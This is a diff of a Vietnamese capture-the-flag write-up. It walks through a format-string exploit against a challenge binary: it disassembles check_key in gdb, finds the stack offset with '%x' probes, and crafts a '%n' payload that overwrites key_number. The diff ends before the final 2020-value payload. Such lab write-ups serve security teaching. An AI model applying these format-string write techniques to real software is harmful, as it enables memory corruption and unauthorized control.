@@ -93,7 +93,7 @@ Vậy việc chúng ta cần làm là lợi dụng lỗ hổng format string đ�
 
 Hàm `printf` ngoài chức năng in thì nó còn có thể gán giá trị một biến bằng một số nào đó sử dụng format string `%n`. Ví dụ lệnh `printf("damdang%n", &boo);` dùng để gán giá trị biến `boo` bằng `7` - chính là số ký tự trước `%n`.
 
-Bây giờ chúng ta cần tìm địa chỉ của biến `key_number` (sử dụng lệnh `info variables`):
+Bây giờ chúng ta cần tìm địa chỉ của biến `key_number`:
 
 ```
 pwndbg> i var
@@ -127,11 +127,105 @@ Non-debugging symbols:
 0x0804a050  _end
 ```
 
-Vậy địa chỉ của `key_number` là `0x0804a04c`, chúng ta sẽ tìm cách gán `2020` vào địa chỉ này.
+Vậy địa chỉ của `key_number` là `0x0804a04c`.
 
-Quay lại ví dụ bên trên `printf("damdang%n", &boo);`. Trường hợp này là truyền đủ và đúng tham số, nhưng chúng ta không cần quan tâm tới việc truyền đúng hay sai. Bản chất cách hoạt động của hàm trên là đếm số ký tự trước `%n` và gán vào vị trí mà hàm `printf` trỏ tới. Có nghĩ là trước hết chúng ta cần đảm bảo hàm `printf` trỏ tới địa chỉ `0x0804a04c`.
+Chúng ta thử đặt breakpoint và dùng gdb debug xem giá trị của biến `key_number` lúc so sánh với `2020` là bao nhiêu:
 
-Chúng ta sẽ thử bằng cách truyền `0x0804a04c` và
+```
+pwndbg> disass check_key
+Dump of assembler code for function check_key:
+   0x08048594 <+0>:     push   ebp
+   0x08048595 <+1>:     mov    ebp,esp
+   0x08048597 <+3>:     sub    esp,0x8
+   0x0804859a <+6>:     mov    eax,ds:0x804a04c
+   0x0804859f <+11>:    cmp    eax,0x7e4
+   0x080485a4 <+16>:    je     0x80485b8 <check_key+36>
+   0x080485a6 <+18>:    sub    esp,0xc
+   0x080485a9 <+21>:    push   0x8048728
+   0x080485ae <+26>:    call   0x8048400 <printf@plt>
+   0x080485b3 <+31>:    add    esp,0x10
+   0x080485b6 <+34>:    jmp    0x80485cd <check_key+57>
+   0x080485b8 <+36>:    sub    esp,0xc
+   0x080485bb <+39>:    push   0x804873b
+   0x080485c0 <+44>:    call   0x8048400 <printf@plt>
+   0x080485c5 <+49>:    add    esp,0x10
+   0x080485c8 <+52>:    call   0x804857b <cat_flag>
+   0x080485cd <+57>:    nop
+   0x080485ce <+58>:    leave  
+   0x080485cf <+59>:    ret    
+End of assembler dump.
+pwndbg> break *0x0804859f
+Breakpoint 1 at 0x804859f
+pwndbg> run
+Starting program: /home/kali/Desktop/WGC August 2020/fms 
+Is any body here? (yes or no)
+boodamdang
+boodamdang
+
+Breakpoint 1, 0x0804859f in check_key ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
+ EAX  0x0
+ EBX  0x0
+ ECX  0x6c0
+ EDX  0x804b1a0 ◂— 'boodamdang\n here? (yes or no)\n'
+ EDI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ ESI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ EBP  0xffffd2a8 —▸ 0xffffd2f8 ◂— 0x0
+ ESP  0xffffd2a0 —▸ 0xf7fb1d20 (_IO_2_1_stdout_) ◂— test   byte ptr [edx], ch /* 0xfbad2a84 */
+ EIP  0x804859f (check_key+11) ◂— cmp    eax, 0x7e4
+```
+
+Có thể thấy giá trị tại địa chỉ `0x0804a04c` (chính là `key_number`) được lưu vào thanh ghi `eax` và có giá trị là `0`. Chúng ta sẽ tìm cách gán `2020` vào địa chỉ này.
+
+Quay lại ví dụ bên trên `printf("damdang%n", &boo);`. Trường hợp này là truyền đủ và đúng tham số, nhưng chúng ta không cần quan tâm tới việc truyền đúng hay sai. Bản chất cách hoạt động của hàm trên là đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới. Có nghĩa là trước hết chúng ta cần đảm bảo hàm `printf` trỏ tới địa chỉ `0x0804a04c`.
+
+Chúng ta sẽ thử như sau:
+
+```
+kali@kali:~/Desktop/WGC August 2020$ python -c "print 'aaaa' + '%x'*1" | ./fms
+Is any body here? (yes or no)
+aaaa8048768
+This isn't enough.
+kali@kali:~/Desktoppython -c "print 'aaaa' + '%x'*2" | ./fms
+Is any body here? (yes or no)
+aaaa8048768f7f2d580
+This isn't enough.
+kali@kali:~/Desktop/WGC August 2020$ python -c "print 'aaaa' + '%x'*3" | ./fms
+Is any body here? (yes or no)
+aaaa8048768f7f10580f7f0ea80
+This isn't enough.
+kali@kali:~/Desktop/WGC August 2020$ python -c "print 'aaaa' + '%x'*4" | ./fms
+Is any body here? (yes or no)
+aaaa8048768f7fa5580f7fa3a8061616161
+This isn't enough.
+```
+
+Ở case cuối, `61616161` được in ra - có nghĩa là `%x` thứ 4 trỏ tới vị trí lưu chuỗi `aaaa` chúng ta truyền vào. Vậy bây giờ chúng ta sẽ thay `aaaa` bằng `\x4c\xa0\x04\x08` (Little Endian), thay `%x` thứ 4 bằng `%n` và dùng gdb để debug xem giá trị tại địa chỉ `0x0804a04c` có được gán bằng giá trị khác 0 hay không:
+
+```
+pwndbg> run <<< $(python -c "print '\x4c\xa0\x04\x08' + '%x'*3 + '%n'")
+Starting program: /home/kali/Desktop/WGC August 2020/fms <<< $(python -c "print '\x4c\xa0\x04\x08' + '%x'*3 + '%n'")    
+Is any body here? (yes or no)                                                                                           
+L8048768f7fb1580f7fafa80
+
+Breakpoint 1, 0x0804859f in check_key ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
+ EAX  0x1b
+ EBX  0x0
+ ECX  0x6c0
+ EDX  0x804b1a0 —▸ 0x804a04c (key_number) ◂— 0x1b
+ EDI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ ESI  0xf7fb1000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */
+ EBP  0xffffd2a8 —▸ 0xffffd2f8 ◂— 0x0
+ ESP  0xffffd2a0 —▸ 0xf7fb1d20 (_IO_2_1_stdout_) ◂— test   byte ptr [edx], ch /* 0xfbad2a84 */
+ EIP  0x804859f (check_key+11) ◂— cmp    eax, 0x7e4
+```
+
+Thanh ghi `eax` lưu giá trị `0x1b` - có nghĩa là chúng ta đã gán giá trị cho `key_number` thành công.
+
+Như đã nói ở trên, hàm `printf` đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới, mà giá trị chúng ta muốn gán là `2020` - có nghĩa trước `%n` phải có `2020` ký tự, trong khi độ dài input tối đa mà chương trình cho chúng ta nhập là `64`. Để giả quyết vấn đề này, chúng ta sử dụng ký hiệu `$`.
 
 ## It is simple, but not easy
 
